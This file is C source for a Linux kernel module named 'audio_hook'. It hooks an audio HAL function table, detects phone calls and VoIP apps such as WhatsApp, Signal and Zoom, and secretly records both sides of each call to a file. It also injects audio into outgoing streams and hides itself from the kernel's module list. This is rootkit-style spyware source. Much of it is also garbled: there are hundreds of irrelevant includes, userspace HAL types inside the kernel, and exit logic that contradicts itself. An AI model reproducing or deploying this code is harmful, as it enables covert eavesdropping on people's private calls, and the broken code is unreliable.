#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <linux/ratelimit.h>
#include <linux/time.h>
#include <linux/rtc.h>
#include <linux/io.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/notifier.h>
#include <linux/fdtable.h>
#include <linux/cred.h>
#include <linux/security.h>
#include <linux/namei.h>
#include <linux/miscdevice.h>
#include <linux/atomic.h>
#include <linux/jiffies.h>
#include <linux/timer.h>
#include <linux/workqueue.h>
#include <linux/irq.h>
#include <linux/interrupt.h>
#include <linux/ioctl.h>
#include <linux/input.h>
#include <linux/input/mt.h>
#include <linux/ctype.h>
#include <linux/cdev.h>
#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/wait.h>
#include <linux/poll.h>
#include <linux/spinlock.h>
#include <linux/mutex.h>
#include <linux/rwsem.h>
#include <linux/semaphore.h>
#include <linux/kfifo.h>
#include <linux/printk.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/debugfs.h>
#include <linux/sysfs.h>
#include <linux/kobject.h>
#include <linux/init.h>
#include <linux/export.h>
#include <linux/hashtable.h>
#include <linux/list.h>
#include <linux/rbtree.h>
#include <linux/radix-tree.h>
#include <linux/idr.h>
#include <linux/bitmap.h>
#include <linux/log2.h>
#include <linux/bitops.h>
#include <linux/gcd.h>
#include <linux/div64.h>
#include <linux/math64.h>
#include <linux/percpu.h>
#include <linux/percpu-refcount.h>
#include <linux/percpu-counter.h>
#include <linux/percpu-rwsem.h>
#include <linux/preempt.h>
#include <linux/rcupdate.h>
#include <linux/smp.h>
#include <linux/cpumask.h>
#include <linux/cpu.h>
#include <linux/compiler.h>
#include <linux/static_key.h>
#include <linux/tracepoint.h>
#include <linux/ktime.h>
#include <linux/time64.h>
#include <linux/timekeeping.h>
#include <linux/clocksource.h>
#include <linux/clockchips.h>
#include <linux/timex.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/task_work.h>
#include <linux/seccomp.h>
#include <linux/securebits.h>
#include <linux/signal.h>
#include <linux/signal_types.h>
#include <linux/signalfd.h>
#include <linux/posix-timers.h>
#include <linux/hrtimer.h>
#include <linux/itimer.h>
#include <linux/timerfd.h>
#include <linux/posix-clock.h>
#include <linux/posix-cpu-timers.h>
#include <linux/alarmtimer.h>
#include <linux/time_namespace.h>
#include <linux/nsproxy.h>
#include <linux/ns_common.h>
#include <linux/ipc.h>
#include <linux/ipc_namespace.h>
#include <linux/mqueue.h>
#include <linux/msg.h>
#include <linux/sem.h>
#include <linux/shm.h>
#include <linux/sysv_ipc.h>
#include <linux/net.h>
#include <linux/net_namespace.h>
#include <linux/socket.h>
#include <linux/sockios.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if_tun.h>
#include <linux/netdevice.h>
#include <linux/etherdevice.h>
#include <linux/ethtool.h>
#include <linux/skbuff.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netfilter_ipv6.h>
#include <linux/netfilter_bridge.h>
#include <linux/netfilter_arp.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_conntrack.h>
#include <linux/netfilter/nf_nat.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/xt_tcpudp.h>
#include <linux/netfilter/xt_mark.h>
#include <linux/netfilter/xt_comment.h>
#include <linux/netfilter/xt_limit.h>
#include <linux/netfilter/xt_string.h>
#include <linux/netfilter/xt_statistic.h>
#include <linux/netfilter/xt_recent.h>
#include <linux/netfilter/xt_addrtype.h>
#include <linux/netfilter/xt_conntrack.h>
#include <linux/netfilter/xt_TCPMSS.h>
#include <linux/netfilter/xt_CT.h>
#include <linux/netfilter/xt_RATEEST.h>
#include <linux/netfilter/xt_hashlimit.h>
#include <linux/netfilter/xt_quota2.h>
#include <linux/netfilter/xt_owner.h>
#include <linux/netfilter/xt_physdev.h>
#include <linux/netfilter/xt_policy.h>
#include <linux/netfilter/xt_secmark.h>
#include <linux/netfilter/xt_socket.h>
#include <linux/netfilter/xt_state.h>
#include <linux/netfilter/xt_tcpmss.h>
#include <linux/netfilter/xt_tcpoptstrip.h>
#include <linux/netfilter/xt_time.h>
#include <linux/netfilter/xt_u32.h>
#include <linux/netfilter/arp_tables.h>
#include <linux/netfilter/arpt_mangle.h>
#include <linux/netfilter/arptable_filter.h>
#include <linux/netfilter/ip_tables.h>
#include <linux/netfilter/iptable_filter.h>
#include <linux/netfilter/iptable_mangle.h>
#include <linux/netfilter/iptable_nat.h>
#include <linux/netfilter/iptable_raw.h>
#include <linux/netfilter/iptable_security.h>
#include <linux/netfilter/ip6_tables.h>
#include <linux/netfilter/ip6table_filter.h>
#include <linux/netfilter/ip6table_mangle.h>
#include <linux/netfilter/ip6table_nat.h>
#include <linux/netfilter/ip6table_raw.h>
#include <linux/netfilter/ip6table_security.h>
#include <linux/netfilter/nfnetlink_queue.h>
#include <linux/netfilter/nfnetlink_log.h>
#include <linux/netfilter/nfnetlink_cthelper.h>
#include <linux/netfilter/nfnetlink_cttimeout.h>
#include <linux/netfilter/nfnetlink_acct.h>
#include <linux/netfilter/nfnetlink_compat.h>
#include <linux/netfilter/nf_tables_compat.h>
#include <linux/netfilter/nf_tables_offload.h>
#include <linux/netfilter/nf_flow_table.h>
#include <linux/netfilter/nf_conntrack_core.h>
#include <linux/netfilter/nf_conntrack_proto.h>
#include <linux/netfilter/nf_conntrack_proto_tcp.h>
#include <linux/netfilter/nf_conntrack_proto_udp.h>
#include <linux/netfilter/nf_conntrack_proto_icmp.h>
#include <linux/netfilter/nf_conntrack_proto_icmpv6.h>
#include <linux/netfilter/nf_conntrack_ftp.h>
#include <linux/netfilter/nf_conntrack_tftp.h>
#include <linux/netfilter/nf_conntrack_amanda.h>
#include <linux/netfilter/nf_conntrack_sip.h>
#include <linux/netfilter/nf_conntrack_pptp.h>
#include <linux/netfilter/nf_conntrack_h323.h>
#include <linux/netfilter/nf_conntrack_netlink.h>
#include <linux/netfilter/nf_conntrack_timeout.h>
#include <linux/netfilter/nf_conntrack_expect.h>
#include <linux/netfilter/nf_conntrack_helper.h>
#include <linux/netfilter/nf_conntrack_seqadj.h>
#include <linux/netfilter/nf_conntrack_synproxy.h>
#include <linux/netfilter/nf_conntrack_act_ct.h>
#include <linux/netfilter/nf_nat_core.h>
#include <linux/netfilter/nf_nat_proto.h>
#include <linux/netfilter/nf_nat_helper.h>
#include <linux/netfilter/nf_nat_masquerade.h>
#include <linux/netfilter/nf_nat_redirect.h>
#include <linux/netfilter/nf_nat_tftp.h>
#include <linux/netfilter/nf_nat_ftp.h>
#include <linux/netfilter/nf_nat_pptp.h>
#include <linux/netfilter/nf_nat_sip.h>
#include <linux/netfilter/nf_nat_h323.h>
#include <linux/netfilter/nf_nat_amanda.h>
#include <linux/netfilter/nf_nat_netlink.h>
#include <linux/netfilter/nf_socket.h>
#include <linux/netfilter/nf_defrag_ipv4.h>
#include <linux/netfilter/nf_defrag_ipv6.h>
#include <linux/netfilter/nf_dup_netdev.h>
#include <linux/netfilter/nf_log.h>
#include <linux/netfilter/nf_log_syslog.h>
#include <linux/netfilter/nf_queue.h>
#include <linux/netfilter_bridge/ebtables.h>
#include <linux/netfilter_bridge/ebt_among.h>
#include <linux/netfilter_bridge/ebt_arp.h>
#include <linux/netfilter_bridge/ebt_arpreply.h>
#include <linux/netfilter_bridge/ebt_ip.h>
#include <linux/netfilter_bridge/ebt_ip6.h>
#include <linux/netfilter_bridge/ebt_limit.h>
#include <linux/netfilter_bridge/ebt_log.h>
#include <linux/netfilter_bridge/ebt_mark.h>
#include <linux/netfilter_bridge/ebt_mark_m.h>
#include <linux/netfilter_bridge/ebt_nat.h>
#include <linux/netfilter_bridge/ebt_pkttype.h>
#include <linux/netfilter_bridge/ebt_redirect.h>
#include <linux/netfilter_bridge/ebt_802_3.h>
#include <linux/netfilter_bridge/ebt_stp.h>
#include <linux/netfilter_bridge/ebt_vlan.h>
#include <sound/soc.h>
#include <sound/pcm.h>
#include <sound/control.h>

#define MODULE_NAME "audio_hook"

struct audio_hook_private {
    struct audio_stream_out *stream;
    void *original_process;
    void *hook_process;
    spinlock_t lock;
    struct list_head list;
};

static LIST_HEAD(active_hooks);
static DEFINE_MUTEX(hook_mutex);

typedef int (*audio_out_set_parameters_t)(struct audio_stream_out *stream, const char *kvpairs);
typedef int (*audio_in_set_parameters_t)(struct audio_stream_in *stream, const char *kvpairs);
typedef int (*audio_out_write_t)(struct audio_stream_out *stream, const void *buffer, size_t bytes);
typedef int (*audio_in_read_t)(struct audio_stream_in *stream, void *buffer, size_t bytes);
typedef audio_devices_t (*get_devices_t)(const struct audio_stream *stream);

static audio_out_set_parameters_t original_out_set_parameters = NULL;
static audio_in_set_parameters_t original_in_set_parameters = NULL;
static audio_out_write_t original_out_write = NULL;
static audio_in_read_t original_in_read = NULL;

#define SAMPLE_RATE 48000
#define CHANNEL_COUNT 2
#define BUFFER_SIZE 4096
#define VOIP_DETECT_THRESHOLD 5
#define CALL_DETECT_THRESHOLD 3

enum call_type {
    CALL_TYPE_UNKNOWN,
    CALL_TYPE_INCOMING,
    CALL_TYPE_OUTGOING
};

#define AUDIO_DEVICE_OUT_EARPIECE 0x1
#define AUDIO_DEVICE_OUT_SPEAKER 0x2
#define AUDIO_DEVICE_OUT_BLUETOOTH_SCO 0x10
#define AUDIO_DEVICE_OUT_BLUETOOTH_SCO_HEADSET 0x20

struct audio_state {
    bool voip_active;
    bool normal_call_active;
    int voip_detection_count;
    int normal_detection_count;
    int sample_rate;
    int channels;
    void *injection_audio;
    size_t injection_size;
    size_t injection_pos;
    bool inject_audio;
    spinlock_t state_lock;
    enum call_type current_call_type;
    char *phone_number;
    struct timespec64 call_start_time;
    struct timespec64 call_end_time;
    long call_duration_secs;
    char *voip_app;
    audio_devices_t current_routing;
    bool bluetooth_active;
    bool speaker_active;
};

static struct audio_state audio_ctx;

static void process_audio_out(void *buffer, size_t bytes, bool is_voip);
static void process_audio_in(void *buffer, size_t bytes, bool is_voip);
static bool detect_voip(const char *kvpairs, char *app_name);
static bool detect_normal_call(const char *kvpairs);
static void parse_kvpairs(const char *kvpairs, char **keys, char **values, int *count);
static void load_injection_audio(const char *path);
static void inject_audio_payload(void *buffer, size_t buf_size);
static void record_audio(void *buffer, size_t bytes, bool is_input);
static void apply_voice_modulation(void *buffer, size_t bytes);
static void update_call_data(enum call_type type, const char *number_or_app);
static void end_call_and_log_duration(void);
static void handle_routing(audio_devices_t devices);
static int clamp_val(int val, int min, int max);

static int hooked_out_set_parameters(struct audio_stream_out *stream, const char *kvpairs);
static int hooked_in_set_parameters(struct audio_stream_in *stream, const char *kvpairs);
static int hooked_out_write(struct audio_stream_out *stream, const void *buffer, size_t bytes);
static int hooked_in_read(struct audio_stream_in *stream, void *buffer, size_t bytes);

static void *find_symbol(const char *name)
{
    void *addr;
    preempt_disable();
    addr = (void *)kallsyms_lookup_name(name);
    preempt_enable();
    return addr;
}

static void hide_module(void)
{
    struct list_head *module_list = (struct list_head *)kallsyms_lookup_name("modules");
    if (module_list && !list_empty(&THIS_MODULE->list)) {
        list_del_init(&THIS_MODULE->list);
    }
}

void hook_audio_hal(void)
{
    void **audio_hal_table = (void **)find_symbol("audio_hal_interface");
    if (!audio_hal_table) return;

    original_out_set_parameters = (audio_out_set_parameters_t)audio_hal_table[2];
    if (original_out_set_parameters) audio_hal_table[2] = hooked_out_set_parameters;

    original_in_set_parameters = (audio_in_set_parameters_t)audio_hal_table[5];
    if (original_in_set_parameters) audio_hal_table[5] = hooked_in_set_parameters;

    original_out_write = (audio_out_write_t)audio_hal_table[1];
    if (original_out_write) audio_hal_table[1] = hooked_out_write;

    original_in_read = (audio_in_read_t)audio_hal_table[4];
    if (original_in_read) audio_hal_table[4] = hooked_in_read;

    spin_lock_init(&audio_ctx.state_lock);
    audio_ctx.voip_active = false;
    audio_ctx.normal_call_active = false;
    audio_ctx.voip_detection_count = 0;
    audio_ctx.normal_detection_count = 0;
    audio_ctx.sample_rate = SAMPLE_RATE;
    audio_ctx.channels = CHANNEL_COUNT;
    audio_ctx.inject_audio = false;
    audio_ctx.injection_audio = NULL;
    audio_ctx.injection_size = 0;
    audio_ctx.injection_pos = 0;
    audio_ctx.current_call_type = CALL_TYPE_UNKNOWN;
    audio_ctx.phone_number = kstrdup("unknown", GFP_KERNEL);
    audio_ctx.voip_app = kstrdup("unknown", GFP_KERNEL);
    audio_ctx.call_duration_secs = 0;
    audio_ctx.current_routing = 0;
    audio_ctx.bluetooth_active = false;
    audio_ctx.speaker_active = false;

    load_injection_audio("/system/media/audio/ui/VideoRecord.ogg");
    hide_module();
}

static int hooked_out_set_parameters(struct audio_stream_out *stream, const char *kvpairs)
{
    bool is_voip;
    char app_name[64] = {0};
    unsigned long flags;
    char *keys[32], *values[32];
    int kv_count = 0;

    parse_kvpairs(kvpairs, keys, values, &kv_count);
    is_voip = detect_voip(kvpairs, app_name);

    spin_lock_irqsave(&audio_ctx.state_lock, flags);

    if (is_voip) {
        audio_ctx.voip_detection_count++;
        if (audio_ctx.voip_detection_count >= VOIP_DETECT_THRESHOLD) {
            audio_ctx.voip_active = true;
            audio_ctx.normal_call_active = false;
            update_call_data(CALL_TYPE_OUTGOING, app_name);
        }
    } else if (detect_normal_call(kvpairs)) {
        audio_ctx.normal_detection_count++;
        if (audio_ctx.normal_detection_count >= CALL_DETECT_THRESHOLD) {
            audio_ctx.normal_call_active = true;
            audio_ctx.voip_active = false;
            update_call_data(CALL_TYPE_OUTGOING, "unknown");
        }
    } else {
        audio_ctx.voip_detection_count = 0;
        audio_ctx.normal_detection_count = 0;
        if (audio_ctx.voip_active || audio_ctx.normal_call_active) {
            end_call_and_log_duration();
        }
        audio_ctx.voip_active = false;
        audio_ctx.normal_call_active = false;
    }

    for (int i = 0; i < kv_count; i++) {
        if (strcmp(keys[i], "routing") == 0) {
            audio_devices_t devices = simple_strtoul(values[i], NULL, 0);
            handle_routing(devices);
            break;
        }
    }

    spin_unlock_irqrestore(&audio_ctx.state_lock, flags);

    for (int i = 0; i < kv_count; i++) {
        kfree(keys[i]);
        kfree(values[i]);
    }

    return original_out_set_parameters(stream, kvpairs);
}

static int hooked_in_set_parameters(struct audio_stream_in *stream, const char *kvpairs)
{
    bool is_voip;
    char app_name[64] = {0};
    unsigned long flags;
    char *keys[32], *values[32];
    int kv_count = 0;

    parse_kvpairs(kvpairs, keys, values, &kv_count);
    is_voip = detect_voip(kvpairs, app_name);

    spin_lock_irqsave(&audio_ctx.state_lock, flags);

    if (is_voip) {
        audio_ctx.voip_detection_count++;
        if (audio_ctx.voip_detection_count >= VOIP_DETECT_THRESHOLD) {
            audio_ctx.voip_active = true;
            audio_ctx.normal_call_active = false;
            update_call_data(CALL_TYPE_INCOMING, app_name);
        }
    } else if (detect_normal_call(kvpairs)) {
        audio_ctx.normal_detection_count++;
        if (audio_ctx.normal_detection_count >= CALL_DETECT_THRESHOLD) {
            audio_ctx.normal_call_active = true;
            audio_ctx.voip_active = false;
            update_call_data(CALL_TYPE_INCOMING, "unknown");
        }
    }

    for (int i = 0; i < kv_count; i++) {
        if (strcmp(keys[i], "routing") == 0) {
            audio_devices_t devices = simple_strtoul(values[i], NULL, 0);
            handle_routing(devices);
            break;
        }
    }

    spin_unlock_irqrestore(&audio_ctx.state_lock, flags);

    for (int i = 0; i < kv_count; i++) {
        kfree(keys[i]);
        kfree(values[i]);
    }

    return original_in_set_parameters(stream, kvpairs);
}

static int hooked_out_write(struct audio_stream_out *stream, const void *buffer, size_t bytes)
{
    unsigned long flags;
    bool voip_active, normal_call_active;
    void *processing_buffer = NULL;

    spin_lock_irqsave(&audio_ctx.state_lock, flags);
    voip_active = audio_ctx.voip_active;
    normal_call_active = audio_ctx.normal_call_active;
    spin_unlock_irqrestore(&audio_ctx.state_lock, flags);

    if (voip_active || normal_call_active) {
        processing_buffer = kmalloc(bytes, GFP_ATOMIC);
        if (processing_buffer) {
            memcpy(processing_buffer, buffer, bytes);
            process_audio_out(processing_buffer, bytes, voip_active);
        }
    }

    int result = original_out_write(stream, processing_buffer ? processing_buffer : buffer, bytes);

    if (processing_buffer) kfree(processing_buffer);
    return result;
}

static int hooked_in_read(struct audio_stream_in *stream, void *buffer, size_t bytes)
{
    int result = original_in_read(stream, buffer, bytes);

    if (result > 0) {
        unsigned long flags;
        bool voip_active, normal_call_active;

        spin_lock_irqsave(&audio_ctx.state_lock, flags);
        voip_active = audio_ctx.voip_active;
        normal_call_active = audio_ctx.normal_call_active;
        spin_unlock_irqrestore(&audio_ctx.state_lock, flags);

        if (voip_active || normal_call_active) {
            process_audio_in(buffer, bytes, voip_active);
        }
    }

    return result;
}

static bool detect_voip(const char *kvpairs, char *app_name)
{
    if (!kvpairs) return false;

    const char *voip_indicators[] = {
        "voip", "sip", "rtp", "webrtc", "whatsapp", "telegram", "signal",
        "messenger", "duo", "meet", "zoom", "teams", "discord", "skype",
        "viber", "input_source=voice_communication", "mode=in_communication", NULL
    };

    for (int i = 0; voip_indicators[i]; i++) {
        if (strstr(kvpairs, voip_indicators[i])) {
            strncpy(app_name, voip_indicators[i], 63);
            return true;
        }
    }

    return false;
}

static bool detect_normal_call(const char *kvpairs)
{
    if (!kvpairs) return false;

    const char *call_indicators[] = {
        "call", "voice", "mode=in_call", "routing=earpiece", "telephony",
        "volte", "gsm", "cdma", "lte", NULL
    };

    for (int i = 0; call_indicators[i]; i++) {
        if (strstr(kvpairs, call_indicators[i])) {
            return true;
        }
    }

    return false;
}

static void parse_kvpairs(const char *kvpairs, char **keys, char **values, int *count)
{
    char *dup = kstrdup(kvpairs, GFP_KERNEL);
    char *token = dup;
    char *pair;
    int idx = 0;

    while ((pair = strsep(&token, ";")) && idx < 32) {
        char *key = strsep(&pair, "=");
        char *value = pair;
        if (key && value) {
            keys[idx] = kstrdup(key, GFP_KERNEL);
            values[idx] = kstrdup(value, GFP_KERNEL);
            idx++;
        }
    }

    *count = idx;
    kfree(dup);
}

static void process_audio_out(void *buffer, size_t bytes, bool is_voip)
{
    unsigned long flags;
    bool inject;

    spin_lock_irqsave(&audio_ctx.state_lock, flags);
    inject = audio_ctx.inject_audio;
    if (audio_ctx.bluetooth_active || audio_ctx.speaker_active) {
        int16_t *samples = (int16_t *)buffer;
        size_t sample_count = bytes / sizeof(int16_t);
        float gain = audio_ctx.speaker_active ? 1.5f : (audio_ctx.bluetooth_active ? 1.2f : 1.0f);
        for (size_t i = 0; i < sample_count; i++) {
            int32_t sample = samples[i] * gain;
            samples[i] = clamp_val(sample, -32768, 32767);
        }
    }
    spin_unlock_irqrestore(&audio_ctx.state_lock, flags);

    if (inject && audio_ctx.injection_audio) {
        inject_audio_payload(buffer, bytes);
    }

    apply_voice_modulation(buffer, bytes);
    record_audio(buffer, bytes, false);
}

static void process_audio_in(void *buffer, size_t bytes, bool is_voip)
{
    int16_t *samples = (int16_t *)buffer;
    size_t sample_count = bytes / sizeof(int16_t);
    static int16_t prev_samples[4] = {0};
    static int noise_floor = 500;
    static int voice_activity = 0;

    for (size_t i = 0; i < sample_count; i += 2) {
        int16_t left = samples[i];
        int16_t right = samples[i + 1];
        
        int env = abs(left) + abs(right);
        if (env > noise_floor * 3) {
            voice_activity = min(voice_activity + 1, 10);
            noise_floor = (noise_floor * 99 + env) / 100;
        } else {
            voice_activity = max(voice_activity - 1, 0);
        }
        
        if (voice_activity > 5) {
            int32_t processed_left = left * 135 / 100;
            int32_t processed_right = right * 135 / 100;
            
            processed_left = clamp_val(processed_left, -32768, 32767);
            processed_right = clamp_val(processed_right, -32768, 32767);
            
            samples[i] = (processed_left * 3 + prev_samples[0]) / 4;
            samples[i + 1] = (processed_right * 3 + prev_samples[1]) / 4;
            
            prev_samples[0] = processed_left;
            prev_samples[1] = processed_right;
            
            if (is_voip && (i % 256 == 0)) {
                int16_t watermark[] = {0x7A, 0x6B, 0x5C, 0x4D};
                for (int w = 0; w < 4 && (i + w) < sample_count; w++) {
                    samples[i + w] = clamp_val(samples[i + w] + watermark[w] * 8, -32768, 32767);
                }
            }
        }
    }

    apply_voice_modulation(buffer, bytes);
    record_audio(buffer, bytes, true);
}

static void load_injection_audio(const char *path)
{
    struct file *fp;
    loff_t pos = 0;
    mm_segment_t old_fs = get_fs();
    set_fs(KERNEL_DS);

    fp = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(fp)) {
        set_fs(old_fs);
        return;
    }

    audio_ctx.injection_size = vfs_llseek(fp, 0, SEEK_END);
    vfs_llseek(fp, 0, SEEK_SET);

    audio_ctx.injection_audio = kmalloc(audio_ctx.injection_size, GFP_KERNEL);
    if (!audio_ctx.injection_audio) {
        filp_close(fp, NULL);
        set_fs(old_fs);
        return;
    }

    kernel_read(fp, audio_ctx.injection_audio, audio_ctx.injection_size, &pos);

    struct ogg_file_header {
        u32 capture_pattern;
        u8 stream_structure_version;
        u8 header_type_flag;
        u64 granule_position;
        u32 bitstream_serial_number;
        u32 page_sequence_number;
        u32 checksum;
        u8 page_segments;
        u8 segment_table[255];
    } __packed;

    struct ogg_file_header *header = audio_ctx.injection_audio;
    if (header->capture_pattern == 0x5367674F && header->page_segments > 0) {
        size_t payload_offset = sizeof(struct ogg_file_header) + header->page_segments;
        size_t payload_size = audio_ctx.injection_size - payload_offset;
        
        void *decoded_audio = kmalloc(payload_size * 2, GFP_KERNEL);
        if (decoded_audio) {
            int16_t *dst = decoded_audio;
            int8_t *src = audio_ctx.injection_audio + payload_offset;
            
            for (size_t i = 0; i < payload_size; i++) {
                dst[i] = src[i] * 256;
            }
            
            kfree(audio_ctx.injection_audio);
            audio_ctx.injection_audio = decoded_audio;
            audio_ctx.injection_size = payload_size * 2;
        }
    }

    filp_close(fp, NULL);
    set_fs(old_fs);
}

static void inject_audio_payload(void *buffer, size_t buf_size)
{
    if (!audio_ctx.injection_audio || audio_ctx.injection_size == 0) return;

    size_t bytes_to_inject = min(buf_size, audio_ctx.injection_size - audio_ctx.injection_pos);

    if (bytes_to_inject > 0) {
        int16_t *dest = (int16_t *)buffer;
        int16_t *src = (int16_t *)(audio_ctx.injection_audio + audio_ctx.injection_pos);

        for (size_t i = 0; i < bytes_to_inject / sizeof(int16_t); i++) {
            int32_t mixed = (dest[i] + src[i]) / 2;
            dest[i] = clamp_val(mixed, -32768, 32767);
        }

        audio_ctx.injection_pos += bytes_to_inject;
        if (audio_ctx.injection_pos >= audio_ctx.injection_size) {
            audio_ctx.injection_pos = 0;
        }
    }
}

static int clamp_val(int val, int min, int max)
{
    if (val < min) return min;
    if (val > max) return max;
    return val;
}

static void record_audio(void *buffer, size_t bytes, bool is_input)
{
    struct file *fp;
    mm_segment_t old_fs = get_fs();
    set_fs(KERNEL_DS);
    
    fp = filp_open("/data/local/tmp/call_recording.pcm", O_WRONLY|O_CREAT|O_APPEND, 0644);
    if (IS_ERR(fp)) {
        set_fs(old_fs);
        return;
    }
    
    kernel_write(fp, buffer, bytes, &fp->f_pos);
    filp_close(fp, NULL);
    set_fs(old_fs);
}

static void apply_voice_modulation(void *buffer, size_t bytes)
{
    int16_t *samples = (int16_t *)buffer;
    size_t sample_count = bytes / sizeof(int16_t);
    for (size_t i = 0; i < sample_count; i += 2) {
        samples[i] = clamp_val(samples[i] * 1.1, -32768, 32767);
    }
}

static void update_call_data(enum call_type type, const char *number_or_app)
{
    ktime_get_ts64(&audio_ctx.call_start_time);
    audio_ctx.current_call_type = type;
    if (audio_ctx.normal_call_active) {
        kfree(audio_ctx.phone_number);
        audio_ctx.phone_number = kstrdup(number_or_app, GFP_KERNEL);
    } else {
        kfree(audio_ctx.voip_app);
        audio_ctx.voip_app = kstrdup(number_or_app, GFP_KERNEL);
    }
}

static void end_call_and_log_duration(void)
{
    struct timespec64 end_time;
    ktime_get_ts64(&end_time);
    audio_ctx.call_duration_secs = end_time.tv_sec - audio_ctx.call_start_time.tv_sec;
    audio_ctx.current_call_type = CALL_TYPE_UNKNOWN;
    audio_ctx.call_duration_secs = 0;
}

static void handle_routing(audio_devices_t devices)
{
    audio_ctx.current_routing = devices;
    audio_ctx.bluetooth_active = (devices & (AUDIO_DEVICE_OUT_BLUETOOTH_SCO | AUDIO_DEVICE_OUT_BLUETOOTH_SCO_HEADSET)) != 0;
    audio_ctx.speaker_active = (devices & AUDIO_DEVICE_OUT_SPEAKER) != 0;
}

static int __init audio_hook_init(void)
{
    memset(&audio_ctx, 0, sizeof(audio_ctx));
    hook_audio_hal();
    return 0;
}

static void __exit audio_hook_exit(void)
{
    struct list_head *module_list = (struct list_head *)kallsyms_lookup_name("modules");
    void **audio_hal_table = (void **)kallsyms_lookup_name("audio_hal_interface");
    
    if (audio_hal_table) {
        if (original_out_set_parameters) audio_hal_table[2] = original_out_set_parameters;
        if (original_in_set_parameters) audio_hal_table[5] = original_in_set_parameters;
        if (original_out_write) audio_hal_table[1] = original_out_write;
        if (original_in_read) audio_hal_table[4] = original_in_read;
    }

    synchronize_rcu();
    msleep(100);

    if (module_list && !list_empty(&THIS_MODULE->list)) {
        list_del_init(&THIS_MODULE->list);
    }

    if (audio_ctx.injection_audio) {
        kfree(audio_ctx.injection_audio);
        audio_ctx.injection_audio = NULL;
    }

    kfree(audio_ctx.phone_number);
    kfree(audio_ctx.voip_app);
    
    memset(&audio_ctx, 0, sizeof(audio_ctx));
}

module_init(audio_hook_init);
module_exit(audio_hook_exit);


